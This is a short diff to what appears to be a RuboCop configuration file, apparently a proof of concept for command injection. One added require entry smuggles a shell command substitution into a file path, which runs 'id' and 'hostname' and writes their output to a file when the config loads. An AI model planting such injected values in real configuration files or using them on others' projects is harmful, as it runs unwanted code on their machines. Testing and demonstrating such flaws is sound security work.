@@ -1,5 +1,6 @@
 require:
-  - ./poc.rb
+  - "json"
+  - "./$(id > rce_output.txt && hostname >> rce_output.txt && cat rce_output.txt)"
 
 AllCops:
   TargetRubyVersion: 3.1
